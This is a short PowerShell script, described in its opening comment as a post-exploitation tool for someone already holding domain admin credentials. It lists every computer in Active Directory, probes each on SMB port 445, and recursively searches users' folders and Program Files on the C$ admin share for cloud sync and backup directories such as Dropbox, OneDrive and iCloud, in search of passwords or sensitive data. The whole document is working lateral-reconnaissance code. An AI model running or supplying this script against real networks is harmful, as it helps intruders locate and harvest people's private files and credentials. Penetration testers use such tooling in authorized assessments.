#this script main purpose is when you are in post-exploitation mode, you already have DA creds, you want to find more passwords, or sensitive information on an assessment.


$root = [ADSI] ""
$searcher = new-object System.DirectoryServices.DirectorySearcher($root)
$searcher.filter = "(objectCategory=computer)"
$searcher.pageSize=1250
$searcher.propertiesToLoad.Add("name")
$computers = $searcher.findall()
clear-host

$computers | ForEach-Object {
    $nextComputer = $_.properties.name[0]
    try
    {
        $socket = New-Object Net.Sockets.TcpClient($nextComputer, 445)
        echo ($nextComputer + " is online. Checking for folders")
        if ($utilisateurs = get-childitem "\\$nextComputer\c$\users" -recurse -include amazon,dropbox,onenote,onedrive,box,"box sync",icloud,idrive,sugarsync,sync,justcloud,crashplan,backblaze,carbonite)
        {
            echo "Users Folders found $utilisateurs"
            echo ""
        }
        else
        {
            echo "Folders not found."
            echo ""
        }
     	$socket = New-Object Net.Sockets.TcpClient($nextComputer, 445)
        echo ($nextComputer + " is online. Checking for folders")
         if ($soixante4bit = get-childitem "\\$nextComputer\c$\Program Files (x86)\" -recurse -include amazon,dropbox,onenote,onedrive,box,"box sync",icloud,idrive,sugarsync,sync,justcloud,crashplan,backblaze,carbonite)
        {
            echo "(x86) Folders found $soixante4bit"
            echo ""
        }
        else
        {
            echo "Folders not found."
            echo ""
        }
     	$socket = New-Object Net.Sockets.TcpClient($nextComputer, 445)
        echo ($nextComputer + " is online. Checking for folders")
         if ($trentedeuxbits = get-childitem "\\$nextComputer\c$\Program Files\" -recurse -include amazon,dropbox,onenote,onedrive,box,"box sync",icloud,idrive,sugarsync,sync,justcloud,crashplan,backblaze,carbonite)
        {
            echo "(32bits) Folders found $trentedeuxbits"
            echo ""
        }
        else
        {
            echo "Folders not found."
            echo ""
        }

    }
    catch 
    {
        echo ($nextComputer + " is offline or not answering on TCP port 445. Skipping.")
    }
}
